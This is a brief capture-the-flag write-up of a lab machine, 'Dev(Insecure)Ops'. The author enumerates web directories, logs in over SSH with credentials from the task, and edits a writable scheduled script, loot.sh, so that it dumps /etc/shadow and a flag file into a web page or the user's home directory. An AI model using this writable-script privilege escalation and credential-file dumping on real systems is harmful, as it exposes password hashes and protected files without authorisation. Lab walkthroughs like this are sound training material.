# Dev(Insecure)Ops 

```bash
export IP=10.10.210.114
```


## Enumerate
```bash
gobuster dir --url http://$IP -w /opt/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -o gobuster/initial
```

found 2 dirs

```bash
dirb http://$IP
````

found `x` pages



## Connect to server (credentials in task info)
```bash
ssh mcskidy@$IP
```

Interesting file in `/home/thegrinch/scripts`

## Testing
Testing changes to contents of `loot.sh` 
```bash
#!/bin/bash

cat /etc/shadow > /var/www/html/ls.html
```

It worked, after few minutes.
Whe got output of `/etc/shadow` in one of the pages found on first step.


## Change the script to output flag

```bash
cat /home/thegrinch/Desktop/flag.txt > /var/www/html/ls.html
```


## Also
You can create write to file where you have `read` permissions. 

That is better way, because target machine may not have web front or don't write there or etc.

So we can create file in our home:
```bash
touch /home/mcskidy/file
```

And then write to it with `loot.sh` something like that:
```bash
cat /home/thegrinch/Desktop/flag.txt > /home/mcskidy/file

```

# Finish